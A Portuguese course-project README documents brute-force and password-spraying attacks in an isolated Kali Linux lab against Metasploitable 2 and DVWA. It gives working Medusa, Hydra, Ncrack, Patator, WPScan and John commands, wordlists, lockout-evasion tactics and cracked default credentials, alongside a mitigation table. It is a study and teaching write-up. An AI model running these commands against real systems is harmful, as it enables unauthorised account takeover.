# 🔐 Ethical Hacking na Prática: Força Bruta com Kali Linux

![Status](https://img.shields.io/badge/status-concluído-success)
![Foco](https://img.shields.io/badge/foco-Ethical%20Hacking-red)
![Ferramentas](https://img.shields.io/badge/ferramentas-Medusa%20%7C%20Hydra%20%7C%20John%20%7C%20WPScan-blue)
![Ambiente](https://img.shields.io/badge/ambiente-Metasploitable%202%20%7C%20DVWA-orange)

> ⚠️ **Aviso Legal:** Todo o conteúdo deste repositório é exclusivamente educacional. Os ataques simulados foram realizados em ambiente controlado, isolado de redes reais. Jamais aplique estas técnicas em sistemas sem autorização explícita.

> 🎓 **Desafio de Projeto — DIO** | Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

---

## 📑 Sumário

- [Contexto e Objetivos](#-contexto-e-objetivos)
- [Ambiente Configurado](#-ambiente-configurado)
- [Arsenal de Ferramentas](#-arsenal-de-ferramentas)
- [Tipos de Ataque Estudados](#-tipos-de-ataque-estudados)
- [Cenários Práticos](#-cenários-práticos)
- [Wordlists Utilizadas](#-wordlists-utilizadas)
- [Medidas de Mitigação](#-medidas-de-mitigação)
- [Aprendizados](#-aprendizados)
- [Referências](#-referências)

---

## 📌 Contexto e Objetivos

Ataques de força bruta continuam sendo uma das formas mais comuns de comprometimento de credenciais em ambientes corporativos, especialmente quando senhas fracas e serviços mal configurados coexistem.

Este projeto documenta o estudo e a simulação prática desses ataques em ambiente controlado, desde a enumeração de usuários até a validação do acesso obtido, passando pelo uso de múltiplas ferramentas do ecossistema Kali Linux.

### 🎯 Objetivos

| # | Objetivo |
|---|----------|
| 1 | Compreender os principais tipos de ataque baseados em credenciais |
| 2 | Configurar ambiente virtualizado isolado com Kali Linux e Metasploitable 2 |
| 3 | Utilizar e comparar ferramentas de força bruta (Medusa, Hydra, Ncrack, John, WPScan, Patator) |
| 4 | Executar ataques em FTP, SMB e formulário web (DVWA) |
| 5 | Documentar vetores de ataque e propor mitigações práticas |

---

## 🖥️ Ambiente Configurado

### Topologia de Rede

```
┌─────────────────────┐        rede host-only        ┌──────────────────────┐
│    Kali Linux        │ ◄──────────────────────────► │   Metasploitable 2   │
│    (Atacante)        │       192.168.56.0/24        │       (Alvo)         │
│   192.168.56.101     │                              │   192.168.56.102     │
└─────────────────────┘                              └──────────────────────┘
```

### Configuração das VMs

| Parâmetro | Kali Linux | Metasploitable 2 |
|-----------|-----------|-----------------|
| Hypervisor | VirtualBox | VirtualBox |
| Rede | Host-only Adapter | Host-only Adapter |
| RAM | 2 GB | 512 MB |
| Finalidade | Atacante | Alvo vulnerável |

> A rede host-only garante isolamento total da rede externa, impedindo que os ataques simulados alcancem sistemas reais.

### Verificação da Conectividade

```bash
# Descoberta do alvo na rede
nmap -sn 192.168.56.0/24

# Mapeamento de portas e serviços no alvo
nmap -sV 192.168.56.102
```

---

## 🛠️ Arsenal de Ferramentas

O curso cobriu diversas ferramentas do ecossistema Kali Linux para força bruta. Cada uma tem seu ponto forte:

| Ferramenta | Especialidade | Melhor Para |
|-----------|--------------|------------|
| **Medusa** | Força bruta paralela e modular | FTP, SMB, SSH, HTTP — múltiplos protocolos simultaneamente |
| **Hydra** | Velocidade e variedade de protocolos | Login web, SSH, RDP, FTP |
| **Ncrack** | Autenticação em rede em alta escala | SSH, RDP, FTP em ambientes corporativos |
| **John the Ripper** | Quebra de hashes offline | Arquivos de senha, hashes vazados |
| **WPScan** | Força bruta específica para WordPress | Enumeração de usuários e senhas em WP |
| **Patator** | Altamente customizável | Cenários complexos com lógica condicional |

### Hydra: Exemplo de Uso

```bash
# Força bruta em SSH
hydra -l root -P senhas.txt ssh://192.168.56.102

# Força bruta em formulário web
hydra -l admin -P senhas.txt 192.168.56.102 http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"
```

### Ncrack: Exemplo de Uso

```bash
# Ataque a SSH com lista de usuários e senhas
ncrack -U usuarios.txt -P senhas.txt ssh://192.168.56.102
```

### John the Ripper: Exemplo de Uso

```bash
# Quebra de hash MD5
john --format=md5 hashes.txt --wordlist=senhas.txt

# Exibir senhas encontradas
john --show hashes.txt
```

### WPScan: Exemplo de Uso

```bash
# Enumeração de usuários WordPress
wpscan --url http://192.168.56.102/wordpress --enumerate u

# Força bruta com wordlist
wpscan --url http://192.168.56.102/wordpress \
  -U usuarios.txt -P senhas.txt
```

### Patator: Exemplo de Uso

```bash
# Força bruta em FTP com condição de falha
patator ftp_login host=192.168.56.102 \
  user=FILE0 password=FILE1 \
  0=usuarios.txt 1=senhas.txt \
  -x ignore:mesg='Login incorrect.'
```

---

## ⚔️ Tipos de Ataque Estudados

### Força Bruta Clássica
Testa todas as combinações possíveis de usuário e senha de forma sequencial ou paralela. Eficaz contra serviços sem account lockout.

```
Usuário: admin → testa: 123456, password, admin, qwerty...
```

### Password Spraying
Testa uma única senha contra muitos usuários. Evita account lockout por não exceder o limite de tentativas por conta.

```
Senha: Senha@2024 → testa contra: admin, root, user, joao, maria...
```

### Credential Stuffing
Utiliza credenciais reais vazadas de outros serviços. Explora o hábito de reutilização de senhas entre plataformas.

```
Lista de vazamentos → testa combinações reais em novo alvo
```

| Tipo | Velocidade | Risco de Lockout | Necessita de Wordlist |
|------|-----------|-----------------|----------------------|
| Força Bruta | Alta | Alto | Sim |
| Password Spraying | Baixa | Baixo | Senha única |
| Credential Stuffing | Média | Médio | Dados vazados |

---

## 💥 Cenários Práticos

### Cenário 1: Força Bruta em FTP com Medusa

**Objetivo:** Comprometer credenciais do serviço FTP ativo no Metasploitable 2.

```bash
medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -t 4
```

| Flag | Significado |
|------|------------|
| `-h` | Host alvo |
| `-U` | Arquivo com lista de usuários |
| `-P` | Arquivo com lista de senhas |
| `-M` | Módulo (protocolo) |
| `-t` | Threads paralelas |

**Resultado esperado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

**Validação:**
```bash
ftp 192.168.56.102
# Login: msfadmin / Senha: msfadmin
```

---

### Cenário 2: Força Bruta em Formulário Web (DVWA)

**Objetivo:** Automatizar tentativas de login no DVWA com segurança no nível Low.

```bash
medusa -h 192.168.56.102 -u admin -P senhas.txt -M web-form \
  -m "FORM:dvwa/login.php" \
  -m "DENY-SIGNAL:Login failed" \
  -m "FORM-DATA:post?username=&password=&Login=Login"
```

> **Limitação encontrada:** DVWA no nível High implementa CSRF token e bloqueio por IP, tornando o ataque automatizado ineficaz sem adaptações. A segurança por camadas funciona.

---

### Cenário 3: Enumeração SMB e Password Spraying

**Objetivo:** Enumerar usuários do serviço SMB e executar spraying para evitar account lockout.

```bash
# Enumeração de usuários via Nmap
nmap --script smb-enum-users 192.168.56.102

# Password spraying com Medusa
medusa -h 192.168.56.102 -U usuarios.txt -p msfadmin -M smbnt -t 2
```

**Validação com smbclient:**
```bash
smbclient //192.168.56.102/tmp -U msfadmin
# Senha: msfadmin
smb: \> ls
```

---

### Cenário 4: Cenário Corporativo Mal Configurado

Simulação de uma empresa com múltiplos serviços ativos, credenciais padrão e sem MFA. O fluxo completo do ataque:

```
1. Nmap          → descoberta de serviços ativos
2. SMB enum      → lista de usuários do domínio
3. Medusa        → password spraying com senha corporativa padrão
4. smbclient     → validação e acesso ao compartilhamento
```

---

## 📄 Wordlists Utilizadas

### usuarios.txt
```
root
admin
msfadmin
user
ftp
service
postgres
www-data
```

### senhas.txt
```
123456
password
admin
root
msfadmin
toor
qwerty
letmein
Senha@2024
empresa123
```

> Em pentest autorizados reais, ferramentas como **rockyou.txt**, **SecLists** ou wordlists customizadas com base em OSINT da organização-alvo são muito mais eficazes.

---

## 🛡️ Medidas de Mitigação

| Vetor | Vulnerabilidade | Mitigação |
|-------|----------------|-----------|
| FTP | Credenciais padrão, protocolo sem criptografia | Desativar FTP; usar SFTP com autenticação por chave |
| Web Form | Sem CSRF token, sem rate limit | Implementar CSRF, CAPTCHA e bloqueio por IP após N tentativas |
| SMB | Credenciais fracas, enumeração de usuários | Desativar SMBv1; senhas fortes; bloquear SMB na borda de rede |
| SSH | Autenticação por senha habilitada | Desativar login por senha; usar apenas chaves SSH |
| WordPress | Enumeração de usuários via API | Desativar enumeração; usar plugin de segurança |
| Todos | Ausência de MFA | Implementar autenticação multifator em todos os serviços |
| Todos | Sem monitoramento | Centralizar logs e configurar alertas para falhas de login (SIEM) |

### Boas Práticas Gerais

- **Senhas fortes:** mínimo de 12 caracteres, com letras maiúsculas, minúsculas, números e símbolos
- **Account lockout:** bloquear temporariamente após 5 tentativas falhas consecutivas
- **MFA:** obrigatório em serviços expostos à internet e acesso privilegiado
- **Princípio do menor privilégio:** cada serviço roda com a conta mínima necessária
- **Inventário de serviços:** desativar qualquer protocolo não utilizado (FTP, Telnet, SMBv1, RDP desnecessário)
- **Monitoramento contínuo:** alertas automáticos para padrões de ataque (múltiplas falhas de login em curto intervalo)

---

## 📚 Aprendizados

**1. Credenciais padrão são o vetor mais simples e mais subestimado.**
O Metasploitable 2 usa `msfadmin/msfadmin` em múltiplos serviços. Em ambientes reais, roteadores, câmeras e servidores internos frequentemente mantêm credenciais de fábrica por anos.

**2. Cada ferramenta tem seu ponto forte.**
Medusa se destaca na paralelização. John the Ripper é soberano em hashes offline. WPScan é especialista em WordPress. Usar a ferramenta certa para cada contexto é tão importante quanto saber usá-la.

**3. Força bruta clássica vs. password spraying.**
Testar muitas senhas contra um usuário dispara account lockout. Testar uma senha contra muitos usuários contorna essa proteção. Entender a diferença é fundamental tanto para atacar quanto para defender.

**4. Interfaces modernas limitam ataques automatizados.**
CSRF tokens, reCAPTCHA e bloqueio por IP tornam o DVWA em nível High praticamente imune ao Medusa sem adaptações. A segurança em camadas realmente funciona.

**5. MFA eleva significativamente o custo do ataque.**
Mesmo com a senha comprometida, o atacante precisa do segundo fator. Não elimina o risco, mas muda completamente a equação.

**6. O domínio de ferramentas clássicas continua essencial na era da IA.**
Entender como Medusa, Nmap e smbclient funcionam permite identificar falsos-positivos, calibrar alertas e compreender o que ferramentas automatizadas realmente fazem por baixo dos panos.

---

## 🔗 Referências

| Recurso | Link |
|---------|------|
| Kali Linux | [kali.org](https://www.kali.org/) |
| Medusa | [foofus.net](http://www.foofus.net/jmk/medusa/medusa.html) |
| DVWA | [dvwa.co.uk](http://www.dvwa.co.uk/) |
| Nmap | [nmap.org](https://nmap.org/book/) |
| SecLists (wordlists) | [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| OWASP Testing Guide | [owasp.org](https://owasp.org/www-project-web-security-testing-guide/) |

---

*Projeto desenvolvido como parte do desafio da [DIO](https://www.dio.me/) — Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux.*
